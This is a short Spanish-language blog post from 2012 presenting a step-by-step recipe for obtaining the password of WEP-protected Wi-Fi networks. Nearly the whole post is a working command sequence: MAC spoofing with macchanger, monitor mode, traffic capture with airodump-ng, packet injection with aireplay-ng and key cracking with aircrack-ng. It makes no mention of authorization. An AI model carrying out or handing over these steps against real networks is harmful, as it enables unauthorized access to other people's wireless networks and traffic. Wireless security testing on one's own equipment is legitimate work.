Title: Ataque básico WEP
Date: 2012-06-20 15:22
Author: ramborg
Category: Systems
Tags: Cracking, wifi
Slug: ataque-basico-wep

Aunque ya casi esta anticuado este tipo de ataque, siguen quedando Wifis
con seguridad WEP. Los pasos para conseguir el password de este tipos de
puntos de accesos son:

    #Ponemos tarjeta en modo promiscuo
    $ sudo airmon-ng start wlan0

    #Cambiamos MAC de nuestra tarjeta 
    $ sudo ifconfig mon0 down
    $ sudo macchanger -m 00:11:22:33:44:55 mon0
    $ sudo ifconfig mon0 up

    #Escaneamos las redes que están a nuestro alcance
    $ sudo airodump-ng mon0

    #Volcamos el tráfico de red
    $ sudo airodump-ng -c [CH] -w [ESSID] --bssid [BSSID] mon0

    #Inyectamos tráficos para capturar mas paquetes
    $ sudo aireplay-ng -1 6000 -a [BSSID] -h 00:11:22:33:44:55 mon0
    $ sudo aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b [BSSID] -h 00:11:22:33:44:55 mon0

    #Ponemos a descifrar la clave con los paquetes capturados
    $ sudo aircrack-ng -z [ESSID]*.cap

La información de esta entrada a sido extraida del blog:  

<http://elblogdepicodev.blogspot.com.es/2012/05/obtener-la-clave-de-una-red-wifi-wep.html>  
via  
<http://planeta.archlinux-es.org/>  
via  
<https://planet.archlinux.org/>
